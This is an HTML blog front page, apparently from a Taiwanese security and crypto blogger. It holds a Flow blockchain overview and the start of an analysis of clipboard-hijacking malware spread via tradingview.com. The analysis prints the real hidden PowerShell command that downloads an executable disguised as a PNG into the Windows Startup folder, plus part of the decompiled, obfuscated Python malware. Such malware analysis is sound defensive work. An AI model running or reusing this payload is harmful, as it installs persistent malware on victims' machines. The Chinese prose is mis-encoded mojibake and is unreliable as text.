<!DOCTYPE html>
<html  lang="en">
<head>
    <meta charset="utf-8" />

<meta name="generator" content="Hexo 4.2.1" />

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

<title>oalieno blog</title>


    <meta name="description" content="å€‹äººéƒ¨è½æ ¼">
<meta property="og:type" content="website">
<meta property="og:title" content="oalieno blog">
<meta property="og:url" content="https://oalieno.github.io/index.html">
<meta property="og:site_name" content="oalieno blog">
<meta property="og:description" content="å€‹äººéƒ¨è½æ ¼">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://oalieno.github.io/images/ogimage.jpg">
<meta property="article:author" content="oalieno">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://oalieno.github.io/images/ogimage.jpg">




<link rel="canonical" href="https://oalieno.github.io/"/>




<link rel="icon" href="/images/favicon.svg">

<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">


    
    
<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>

    
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">

    
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">

    
    
    
    
<link rel="stylesheet" href="/css/bottom-to-top.css">


    
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-87869756-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-87869756-1');
</script>

    
    
    
    <link rel="stylesheet" href="/css/progressbar.css">
<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
    
    <script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    


<link rel="stylesheet" href="/css/style.css">
</head>
<body class="is-2-column">
    <nav class="navbar navbar-main">
    <div class="container">
        <div class="navbar-brand is-flex-center">
            <a class="navbar-item navbar-logo" href="/">
            
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64" width="25" height="25" style="margin-right: 10px"><g id="flat"><path d="M52,23a20,20,0,0,0-40,0V53a4,4,0,0,0,8,0V48a4,4,0,0,0,8,0v9a4,4,0,0    ,0,8,0V44a4,4,0,0,0,8,0V55a4,4,0,0,0,8,0Z" style="fill:#f98c96"/><rect x="19" y="44" width="2" height="2" style="fill:#e4544f"/><rect x="43" y="40" width="2" height="2" style    ="fill:#e4544f"/><path d="M32,37A12,12,0,0,0,44,25H20A12,12,0,0,0,32,37Z" style="fill:#fff"/><path d="M32,33a8,8,0,0,0,8-8H24A8,8,0,0,0,32,33Z" style="fill:#ffd782"/><path d=    "M32,29a4,4,0,0,0,4-4H28A4,4,0,0,0,32,29Z" style="fill:#e4544f"/><path d="M32,13h0A12,12,0,0,1,44,25v0a0,0,0,0,1,0,0H20a0,0,0,0,1,0,0v0A12,12,0,0,1,32,13Z" style="fill:#394d5    c"/><path d="M26,22H24c0-4.746,5.233-6,8-6l0,2C31.757,18,26,18.064,26,22Z" style="fill:#98a5a6"/><path d="M44.132,14.5C40.476,8.1,32.083,8,32,8V6c.392,0,9.629.085,13.868,7.5Z    " style="fill:#e4544f"/><circle cx="7" cy="10" r="3" style="fill:#f98c96"/><circle cx="57" cy="7" r="4" style="fill:#f98c96"/><circle cx="59" cy="37" r="3" style="fill:#f98c9    6"/><circle cx="5" cy="27" r="2" style="fill:#f98c96"/></g></svg>
                oalieno blog
            
            </a>
        </div>
        <div class="navbar-menu">
            
            <div class="navbar-start">
                
                <a class="navbar-item is-active"
                href="/">é¦–é </a>
                
                <a class="navbar-item"
                href="/archives/">æ­·å²æ–‡ç« </a>
                
                <a class="navbar-item"
                href="/categories/">åˆ†é¡</a>
                
                <a class="navbar-item"
                href="/tags/">æ¨™ç±¤</a>
                
                <a class="navbar-item"
                href="/about/">é—œæ–¼æˆ‘</a>
                
                <a class="navbar-item"
                href="/old/">èˆŠéƒ¨è½æ ¼</a>
                
            </div>
            
            <div class="navbar-end">
                
                
                
                <a class="navbar-item search" title="Search" href="javascript:;">
                    <i class="fas fa-search"></i>
                </a>
                
                <a class="navbar-item github-source" href="https://github.com/oalieno/oalieno.github.io">
                    <div class="github-source-icon"><i class="fab fa-lg fa-github-alt"></i></div>
                    <div class="github-source-repository">
                        oalieno/oalieno.github.io
                    </div>
                </a>
            </div>
        </div>
    </div>
</nav>
    
    <section class="section">
        <div class="container">
            <div class="columns">
                <div class="column is-9-tablet is-9-desktop is-9-widescreen has-order-2 column-main">
    
<div class="card card-readmore">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2021-02-26T16:06:00.000Z">2021-02-27</time>
                
                <div class="level-item">
                <a class="has-link-grey -link" href="/categories/blockchain/">blockchain</a>
                </div>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    10 minutes read (About 1533 words)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                <a class="has-link-black-ter" href="/2021/02/27/blockchain/flow/">ã€é …ç›®ä»‹ç´¹ã€‘Flow ( Dapper Labs )</a>
            
        </h1>
        <div class="content">
            <p>é€™å€‹é …ç›®ç®—æ˜¯å¾ˆæ–°çš„é …ç›®ï¼Œå»å¹´çš„ 9/22 - 10/3 æ‰åœ¨ç¬¬ä¸€æ³¢ ICOï¼Œæ¯äººé™è³¼ 1000 USDCï¼Œç•¶æ™‚ ICO çš„åƒ¹æ ¼æ˜¯ä¸€é¡† FLOW è¦åƒ¹ 0.1 USDCï¼Œåˆ°ç¾åœ¨ä¹Ÿæ¼²äº† 200 å€äº†å§ï¼Œåªæ¨æ²’æœ‰è²·æ›´å¤šå•Š Orz ä¸éè¦é–å€‰ä¸€å¹´ï¼Œæ‰€ä»¥è¦åˆ°ä»Šå¹´åº•æ‰æ‹¿çš„å›ä¾†ï¼Œä½†æ˜¯å…‰æ˜¯ç”¢ç”Ÿçš„åˆ©æ¯å°±å·²ç¶“å›æœ¬å¥½å¹¾å€äº†xD<br>
å¥½äº†ï¼Œå»¢è©±ä¸å¤šèªªï¼Œä¸‹é¢ä¾†ä»‹ç´¹ä¸€ä¸‹ flow çš„ç‰¹é»ã€‚</p>
<h2 id="è³‡æº"><a class="header-anchor" href="#è³‡æº"></a>è³‡æº</h2>
<p>é€™é‚Šå…ˆæ”¾å¹¾å€‹é€£çµï¼Œæœ‰èˆˆè¶£å…¥é–€çš„å¯ä»¥çœ‹ä¸€ä¸‹</p>
<ul>
<li><a href="https://www.onflow.org/primer">å®˜æ–¹å¯«çš„å…¥é–€æ–‡ç« </a></li>
<li><a href="https://docs.onflow.org/">å®˜æ–¹çš„æ–‡æª”</a></li>
<li><a href="https://joshuahannan.medium.com/taking-your-first-steps-with-cadence-19dde86bbd0">åœ‹å¤–å¤§ä½¬çš„å…¥å‘æŒ‡å—</a></li>
</ul>
<h2 id="ç‰¹é»"><a class="header-anchor" href="#ç‰¹é»"></a>ç‰¹é»</h2>
<p>Flow æ˜¯å°ˆé–€ç‚ºæ‡‰ç”¨ç¨‹å¼ä»¥åŠéŠæˆ²æ‰€é–‹ç™¼çš„ä¸€æ¢æ–°çš„å€å¡ŠéŠ<br>
åœ¨éŠä¸Šé¢å¯ä»¥ç”¨ Cadence é€™å€‹ç¨‹å¼èªè¨€æ’°å¯« smart contractï¼Œå°æ¯”éš”å£æ£šçš„ Ethereum ç”¨ Solidity å¯« smart contract</p>
<h3 id="Cadence-é€™å€‹ç¨‹å¼èªè¨€æœ‰ä»€éº¼ç‰¹é»å‘¢"><a class="header-anchor" href="#Cadence-é€™å€‹ç¨‹å¼èªè¨€æœ‰ä»€éº¼ç‰¹é»å‘¢"></a>Cadence é€™å€‹ç¨‹å¼èªè¨€æœ‰ä»€éº¼ç‰¹é»å‘¢</h3>
<ul>
<li><strong>Resource-Oriented Programming</strong>
<ul>
<li>è½èªªæ˜¯åƒè€ƒ facebook çš„ Libra ç”¨çš„ Move èªè¨€</li>
<li>è·Ÿ Rust çš„ ownership å¾ˆåƒ</li>
<li>å¯ä»¥çœ‹çœ‹ä¸‹é¢å…©ç¯‡ papersï¼Œåœ¨è¬›æ€éº¼æ¨£è¨­è¨ˆä¸€å€‹é©åˆç”¨åœ¨ smart contract ä¸Šçš„èªè¨€
<ul>
<li><a href="https://src.acm.org/binaries/content/assets/src/2018/michael-coblenz.pdf">Obsidian: A Safer Blockchain Programming Language</a></li>
<li><a href="http://www.cs.cmu.edu/~balzers/publications/digital_contracts_as_session_types.pdf">Resource-Aware Session Types for Digital Contracts</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>Upgradable Smart Contract</strong>
<ul>
<li>å¤šäº†ä¸€å€‹ beta state å¯ä»¥è®“ä½ ç›¡æƒ…çš„ upgradeï¼Œåœ¨é€™å€‹éšæ®µï¼Œå¦‚æœä½¿ç”¨é€™è¦ç”¨å°±è¦è‡ªè¡Œæ‰¿æ“”é¢¨éšªå›‰ï¼Œè©±æ˜¯é€™æ¨£èªªçš„</li>
<li>ç­‰åˆ°éƒ½æ¸¬è©¦å®Œå¾Œï¼Œå°±å¯ä»¥æ­£å¼ release äº†ï¼Œä¹‹å¾Œå°±è·Ÿéš”å£æ£š Ethereum çš„ smart contract ä¸€æ¨£å°±ä¸èƒ½å†æ”¹ä»–äº†</li>
</ul>
</li>
<li><strong>Built-in Logging Support</strong>
<ul>
<li>åªæœƒåœ¨ transaction ä¸Šæ¨™è¨˜ä¸€å€‹è¨˜è™Ÿï¼Œä½ æƒ³è¦çœ‹ log å°±è‡ªå·±åœ¨é›¢ç·šåŸ·è¡Œä¸€æ¬¡å°±å¯ä»¥çœ‹åˆ°äº†ï¼Œä¸åƒéš”å£æ£š Ethereum æŠŠ log å„²å­˜åœ¨éŠä¸Šé¢</li>
<li>åœ¨ Cadence èªè¨€ä¸­å°±ç›´æ¥ <code>log(&quot;hi&quot;)</code> å°±å¯ä»¥å° log äº†ï¼Œä¸åƒéš”å£æ£š Ethereum é‚„è¦å…ˆå®šç¾© event å† emit</li>
</ul>
</li>
</ul>
<h3 id="Flow-é€™æ¢å€å¡ŠéŠæœ‰å“ªäº›ç‰¹é»å‘¢"><a class="header-anchor" href="#Flow-é€™æ¢å€å¡ŠéŠæœ‰å“ªäº›ç‰¹é»å‘¢"></a>Flow é€™æ¢å€å¡ŠéŠæœ‰å“ªäº›ç‰¹é»å‘¢</h3>
<ul>
<li><strong>å‚ç›´åˆ†å·¥ ( pipeline )</strong>ï¼ŒæŠŠå•é¡Œåˆ‡æˆå››ä»½ï¼ŒæŸç¨®å•é¡Œæœƒæœ‰ä¸€ç¨®å°ˆé–€çš„ç¯€é»è² è²¬è™•ç†
<ul>
<li>ä¸åƒéš”å£æ£š Ethereum å°‹æ±‚ sharding çš„è§£æ±ºæ–¹å¼ï¼Œç”¨å¹³è¡Œåˆ†å·¥æŠŠæ‰€æœ‰äº¤æ˜“åˆ‡æˆå¾ˆå¤šå­éŠï¼Œå¤šäº†å¾ˆå¤šå•é¡Œ</li>
<li>åˆ†ä¸‹é¢å››ç¨®å·¥ä½œ
<ul>
<li>Consensus Nodes    : å…±è­˜æ©Ÿåˆ¶åœ¨æ­¤ç™¼åŠŸï¼ŒFlow ä½¿ç”¨ HotStuff å…±è­˜æ©Ÿåˆ¶</li>
<li>Verification Nodes : æª¢æŸ¥æ­£ç¢ºæ€§ï¼Œå–ç· é•è¦è€…</li>
<li>Execution Nodes    : åŸ·è¡Œäº¤æ˜“é™„å¸¶çš„é‚£äº›è¨ˆç®—å·¥ä½œï¼Œä¹Ÿå°±æ˜¯ smart contract è£¡é¢çš„ç¨‹å¼</li>
<li>Collection Nodes   : è² è²¬åŒ…è£äº¤æ˜“å€‘è™•ç†äº›é›œäº‹ï¼Œå†ä¸Ÿçµ¦ Consensus Nodesï¼Œç”¨ä¾†ææ˜‡æ•´é«”å€å¡ŠéŠçš„æ•ˆç‡</li>
</ul>
</li>
<li>ç¸½è€Œè¨€ä¹‹
<ul>
<li>Consensus å’Œ Verification é€™å…©ç¨® Node æ˜¯å®‰å…¨å®ˆé–€å“¡è² è²¬è®“ Flow æ›´å®‰å…¨</li>
<li>Execution å’Œ Collection é€™å…©ç¨® Node æ˜¯ç˜‹ç‹‚æ©Ÿå™¨äººè² è²¬è®“ Flow æ›´æœ‰æ•ˆç‡è·‘å¾—æ›´å¿«</li>
</ul>
</li>
</ul>
</li>
<li>æ¯å€‹å¸³è™Ÿè£¡é¢éƒ½å¯ä»¥æœ‰å¤šå€‹ smart contractï¼Œä¸åƒéš”å£æ£š Ethereum çš„ smart contract å’Œ address æ˜¯ä¸€å°ä¸€çš„é—œä¿‚</li>
<li>å…§å»ºæ”¯æ´ <strong>multi-signature</strong>ï¼Œæ¯å€‹ key æœƒæœ‰ä¸€å€‹ weightï¼Œåªæœ‰ä½ æä¾›çš„ key å€‘çš„ weight åŠ èµ·ä¾†æœ‰ 1000 å°±å¯ä»¥åšäº‹æƒ…äº†</li>
<li>è½å®˜ç¶²ä»‹ç´¹æ˜¯èªªæœ‰<strong>å¸³è™Ÿæ¢å¾©æ©Ÿåˆ¶</strong>ï¼Œä¸æ¸…æ¥šç´°ç¯€</li>
<li>å¼·èª¿èªªä»–éµå®ˆäº†è³‡æ–™åº«ç³»çµ±çš„ ACID ( Atomic, Consistent, Isolated, and Durable ) åŸå‰‡ï¼Œå› ç‚ºæ ¹æœ¬ä¸Šå€å¡ŠéŠå°±æ˜¯ä¸€å€‹å»ä¸­å¿ƒåŒ–çš„è³‡æ–™åº«</li>
</ul>
<h2 id="å¦‚ä½•æˆç‚ºç¯€é»"><a class="header-anchor" href="#å¦‚ä½•æˆç‚ºç¯€é»"></a>å¦‚ä½•æˆç‚ºç¯€é»</h2>
<p><a href="https://docs.onflow.org/node-operation/node-setup">å®˜æ–¹çš„æ–‡æª” - Setting Up a Flow Node</a></p>
<table>
<thead>
<tr>
<th>NODE TYPE</th>
<th>CPU</th>
<th>MEMORY</th>
<th>DISK</th>
</tr>
</thead>
<tbody>
<tr>
<td>Collection</td>
<td>2 cores</td>
<td>16 GB</td>
<td>200 GB</td>
</tr>
<tr>
<td>Consensus</td>
<td>2 coresv</td>
<td>16 GB</td>
<td>200 GB</td>
</tr>
<tr>
<td>Execution</td>
<td>16 cores</td>
<td>128 GB</td>
<td>2 TB</td>
</tr>
<tr>
<td>Verification</td>
<td>2 cores</td>
<td>16 GB</td>
<td>200 GB</td>
</tr>
<tr>
<td>Access</td>
<td>2 cores</td>
<td>16 GB</td>
<td>200 GB</td>
</tr>
</tbody>
</table>
<blockquote>
<p>Make sure you have a sufficiently fast connection; we recommend at least 1Gbps, and 5Gbps is better.</p>
</blockquote>
<p>ç¡¬é«”è¦æ±‚é‚„è¡Œï¼Œæˆ‘çš„æ¡Œæ©Ÿå¥½åƒé‚„èƒ½è·‘ï¼Œä½†æ˜¯é€™å€‹ç¶²é€Ÿè¦æ±‚æœ‰é»é«˜å•Š<br>
è€Œä¸”é‚„è¦å¡«<a href="https://www.onflow.org/node-validators">è¡¨å–®</a>ç”³è«‹ï¼Œå¤ªä¸­å¿ƒåŒ–äº†å•Š<br>
ç„¶å¾Œ<a href="https://docs.onflow.org/node-operation/node-roles">é€™è£¡</a>æœ‰å¯«æ¯ç¨® node è¦è·‘å¾—è©±è¦ stake å¤šå°‘é¡† flowï¼Œæœ€ä¾¿å®œä¹Ÿè‡³å°‘è¦ stake 135000 é¡† flowï¼Œä»¥ç›®å‰çš„åƒ¹æ ¼ä¾†çœ‹å¤§æ¦‚æ˜¯ 270 è¬ç¾é‡‘å§ï¼Œæˆ‘å»</p>
<h2 id="Flow-ç›®å‰çš„ä¸€äº›å•é¡Œ"><a class="header-anchor" href="#Flow-ç›®å‰çš„ä¸€äº›å•é¡Œ"></a>Flow ç›®å‰çš„ä¸€äº›å•é¡Œ</h2>
<p>ç›®å‰ Flow é‚„åœ¨åˆæœŸéšæ®µï¼Œæœ‰äº›æ±è¥¿é‚„æ²’æå¥½<br>
ä¸‹é¢ä¸€äº›è³‡è¨Šæ˜¯æˆ‘åœ¨ discord ç¾¤çœ‹åˆ°çš„</p>
<blockquote>
<p>we still have a lot of things locked down in mainnet right now. The ability to create accounts is one of them. At this time only partnered wallets can create accounts. This will obviously be opened up in the future. At a minimum it wonâ€™t happen until fees are in place on mainnet.</p>
<ul>
<li>qvvg on discord</li>
</ul>
</blockquote>
<p>ä¸»ç¶²è·¯é‚„æ²’å¥½å•Šï¼Œä¸èƒ½éš¨æ„å‰µå¸³è™Ÿ<br>
éœ€è¦ä»–å€‘åˆä½œçš„å¤¥ä¼´åƒæ˜¯ blockto æ‰èƒ½å‰µï¼Œå¯ä»¥ç”¨ <a href="https://port.onflow.org/">https://port.onflow.org/</a> é€™å€‹å‰µå¸³è™Ÿçš„æ¨£å­<br>
é‚„ä¸å¤ å»ä¸­å¿ƒåŒ–å•Š</p>
<blockquote>
<p>Flowâ€™s fee model is still under development, but will have transaction fees. The payer of a transaction can be separate from the authorizer, so dapps can easily pay for their users transactions. Flow keeps tx fees affordable and accessible for all.</p>
<ul>
<li>Flow Assistant Bot on discord</li>
</ul>
</blockquote>
<p>æ‰‹çºŒè²»çš„æ©Ÿåˆ¶ä¹Ÿé‚„æ²’å¼„å¥½å•Š</p>
<blockquote>
<p>Flow is an decentralized protocol being built in an open ecosystem - there is no formal roadmap but if youâ€™d like to see areas people are currently expending effort you can take a look at issues currently in the GitHub repo <a href="https://github.com/onflow/flow/issues">https://github.com/onflow/flow/issues</a> and feel free to create or comment on issues for anything that you think should exist on Flow.</p>
<ul>
<li>Flow Assistant Bot on discord</li>
</ul>
</blockquote>
<p>æ²’æœ‰æ­£å¼çš„ roadmap</p>
<h2 id="Flow-çš„æ‡‰ç”¨"><a class="header-anchor" href="#Flow-çš„æ‡‰ç”¨"></a>Flow çš„æ‡‰ç”¨</h2>
<ul>
<li><a href="https://www.nbatopshot.com/">NBA Top Shot</a>: NBA ä¸»é¡Œçš„ NFTï¼Œå¯ä»¥è®“ä½ æ”¶è—ä½ æœ€æ„›çš„çƒå“¡ï¼Œä»¥åŠä»–å€‘å¾—åˆ†çš„ç‰‡æ®µç­‰</li>
<li><a href="https://viv3.com/">VIV3</a>: è²·è³£ NFT çš„å¹³å°</li>
<li><a href="https://motogp-ignition.com/">MotoGPâ„¢ Ignition</a>: é¡ä¼¼ Ethereum ä¸Šçš„ <a href="https://www.f1deltatime.com/">F1Â® Delta Time</a>ï¼ŒåŒä¸€æ‰¹é–‹ç™¼äººå“¡çš„æ¨£å­ï¼Œåªæ˜¯å¾ F1 è³½è»Šæ”¹æˆ MotoGP æ‘©æ‰˜è»Šï¼Œå¯ä»¥çµ„è£è‡ªå·±çš„è»Šè»Šç„¶å¾Œè·Ÿåˆ¥äººæ¯”è³½ï¼Œä¸‹å€‹æœˆ 3/26 é–‹è³£</li>
<li><a href="https://www.cryptokitties.co/">CryptoKitties</a>: é‚„åœ¨è¨ˆç•«å¾ Ethereum é·ç§»åˆ° Flowï¼Œä¸çŸ¥é“æ˜¯å“ªæ™‚å€™</li>
</ul>
<h2 id="ç¸½çµ"><a class="header-anchor" href="#ç¸½çµ"></a>ç¸½çµ</h2>
<p>Flow æå‡ºäº†å¾ˆå¤šæ–¹æ¡ˆä¾†æ”¹é€²å»ä¸­å¿ƒåŒ–æ‡‰ç”¨é¢è‡¨åˆ°çš„å•é¡Œï¼Œæ¥ä¸‹ä¾†å°±è¦éœå¾…æ™‚é–“çš„è€ƒé©—ï¼Œç­‰æ½®æ°´é€€äº†å°±çŸ¥é“ Flow æœ‰æ²’æœ‰ç©¿è¤²å­äº†</p>
<h2 id="Flow-to-the-Moon-ğŸš€"><a class="header-anchor" href="#Flow-to-the-Moon-ğŸš€"></a><strong>Flow to the Moon ğŸš€</strong></h2>

        </div>
        
        
        <div class="level is-mobile readmore-button">
            <div class="level-start">
                <div class="level-item">
                <a class="button is-size-7 is-light" href="/2021/02/27/blockchain/flow/#more">Read More</a>
                </div>
            </div>
        </div>
        
        
    </div>
</div>








    
<div class="card card-readmore">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2020-08-16T08:24:04.000Z">2020-08-16</time>
                
                <div class="level-item">
                <a class="has-link-grey -link" href="/categories/security/">security</a>&nbsp;/&nbsp;<a class="has-link-grey -link" href="/categories/security/news/">news</a>
                </div>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    7 minutes read (About 1028 words)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                <a class="has-link-black-ter" href="/2020/08/16/security/news/clipboard-hijack/">Clipboard hijacking cryptocurrency malware on tradingview.com</a>
            
        </h1>
        <div class="content">
            <p>æœ€è¿‘åœ¨ <a href="http://tradingview.com">tradingview.com</a> ä¸Šé¢çœ‹åˆ°é€™ç¯‡ Idea <a href="https://www.tradingview.com/chart/EOSUSDT/SDsMZhix-EOS-footprints-of-institutional-money/">EOS - footprints of institutional money</a>ï¼Œçœ‹èµ·ä¾†åƒæ˜¯æ­£å¸¸çš„åˆ†æè¶¨å‹¢èµ°å‘çš„ Ideaï¼Œä½†æ˜¯ä¸‹é¢ç•™è¨€æœ‰ä¸€å€‹é€£çµ <code>mycryptorush.com/signals</code>ï¼Œèªªæ˜¯å¯ä»¥å¾—åˆ°å…è²»çš„ bitcoin å’Œäº¤æ˜“è¶¨å‹¢è¨Šè™Ÿã€‚</p>
<p align="center"><img data-src="/images/clipboard-hijack-1.png" class=" lazyload"  title="tradingview idea"></p>
<p>é»ä¸‹å»å…¶å¯¦æ˜¯å°å‘ <code>tinyurl.com/cryptorushsignals</code>ï¼Œé€™å€‹çŸ­ç¶²å€åˆæ˜¯å°å‘ <code>https://bbuseruploads.s3.amazonaws.com/7e1f7e0b...</code>ï¼Œæœƒä¸‹è¼‰ <code>CryptoRushSignals.zip</code> ä¸‹ä¾†ã€‚çœ‹èµ·ä¾†å°±å¾ˆå¯ç–‘ï¼Œæ˜æ˜çœ‹èµ·ä¾†æ˜¯è¦å»ä¸€å€‹ç¶²ç«™ï¼Œå»è¼‰äº†æª”æ¡ˆä¸‹ä¾†ã€‚è§£å£“ç¸®è©² zip æª”ä¹‹å¾Œæœ‰å…©å€‹æª”æ¡ˆ <code>HOWTOUSE.txt</code> å’Œ <code>CryptoRushSignals.run.lnk</code>ã€‚</p>
<figure class="highlight plain"><figcaption><span>HOWTOUSE.txt</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Open CryptoRushSignals.run, this will open up a website were you can register.</span><br><span class="line">It then automatically will open up an excel sheet with the live current signals.</span><br></pre></td></tr></table></figure>
<p>ç´”æ–‡å­—çš„èªªæ˜æ–‡ä»¶ï¼Œå«ä½ åŸ·è¡Œ <code>CryptoRushSignals.run</code>ï¼ŒçœŸçš„å»åŸ·è¡Œä¹‹å¾Œï¼Œæœƒè·³å‡ºç€è¦½å™¨ç€è¦½ <code>https://t.me/MyCryptoradar</code>ï¼Œè®“ä½ åŠ å…¥ä¸€å€‹ telegram ç¾¤çµ„ï¼Œå°±å¯ä»¥æ”¶åˆ°ä¸€äº›æŒ‡æ¨™æ•¸æ“šçš„è®ŠåŒ–é€šçŸ¥ï¼Œè£¡é¢ç¾åœ¨æœ‰ 400 å¤šäººã€‚</p>
<p align="center"><img data-src="/images/clipboard-hijack-2.png" class=" lazyload"  title="tradingview idea"></p>
<p>é™¤äº†æ‰“é–‹ç€è¦½å™¨å«ä½ åŠ ç¾¤çµ„ä¹‹å¤–ï¼Œä»–é‚„ç§˜å¯†åŸ·è¡Œäº†ä¸‹é¢é€™æ®µ payload</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe"</span> <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> [<span class="type">System.Net.ServicePointManager</span>]::SecurityProtocol = [<span class="type">System.Net.SecurityProtocolType</span>]::Tls12; <span class="built_in">Start-Process</span> <span class="literal">-FilePath</span> <span class="string">"https://t.me/MyCryptoradar; Invoke-WebRequest -Uri "</span>https://bitbucket.org/cryptorushh/cryptorush/downloads/pcmoni.png<span class="string">" -OutFile C:\Users\<span class="variable">$env:UserName</span>\AppData\Roaming\Microsoft\Windows\Start` Menu\Programs\Startup\pclp.exe</span></span><br></pre></td></tr></table></figure>
<p>åŸºæœ¬ä¸Šå°±æ˜¯å» bitbucket ä¸‹è¼‰ <code>https://bitbucket.org/cryptorushh/cryptorush/downloads/pcmoni.png</code> é€™å€‹ pngï¼Œç„¶å¾Œæ”¾åˆ°é–‹æ©Ÿè‡ªå‹•åŸ·è¡Œçš„è·¯å¾‘ï¼Œè€Œä¸”é€™å€‹ä¹Ÿä¸æ˜¯ pngï¼Œä»–å°±æ˜¯ä¸€éš» PE åŸ·è¡Œæª”ã€‚</p>
<p align="center"><img data-src="/images/clipboard-hijack-3.png" class=" lazyload"  title="tradingview idea"></p>
<p>ç¨å¾®çœ‹ä¸€ä¸‹é‚£éš» PE åŸ·è¡Œæª”å¾Œï¼Œç™¼ç¾ä»–æ˜¯ç”¨ py2exe åŒ…çš„ï¼Œé‚£å°±ç”¨ <a href="https://github.com/matiasb/unpy2exe">unpy2exe</a> æ‹†å› pycï¼Œå†ç”¨ <a href="https://github.com/rocky/python-uncompyle6">uncompyle6</a> å°±å¯ä»¥æ‹†å‡ºåŸæœ¬çš„ python script äº†ã€‚</p>
<figure class="highlight python"><figcaption><span>8.61.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.2</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.15 (default, Dec 23 2019, 14:00:59) </span></span><br><span class="line"><span class="comment"># [GCC 4.2.1 Compatible Apple LLVM 10.0.1 (clang-1001.0.46.4)]</span></span><br><span class="line"><span class="comment"># Embedded file name: 8.61.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2020-08-15 23:23:49</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">oo000 = sys.version_info[<span class="number">0</span>] == <span class="number">2</span></span><br><span class="line">ii = <span class="number">2048</span></span><br><span class="line">oOOo = <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">O0</span><span class="params">(ll_opy_)</span>:</span></span><br><span class="line">    o0O = ord(ll_opy_[(<span class="number">-1</span>)])</span><br><span class="line">    iI11I1II1I1I = ll_opy_[:<span class="number">-1</span>]</span><br><span class="line">    oooo = o0O % len(iI11I1II1I1I)</span><br><span class="line">    iIIii1IIi = iI11I1II1I1I[:oooo] + iI11I1II1I1I[oooo:]</span><br><span class="line">    <span class="keyword">if</span> oo000:</span><br><span class="line">        o0OO00 = unicode().join([ unichr(ord(oo) - ii - (i1iII1IiiIiI1 + o0O) % oOOo) <span class="keyword">for</span> i1iII1IiiIiI1, oo <span class="keyword">in</span> enumerate(iIIii1IIi) ])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span 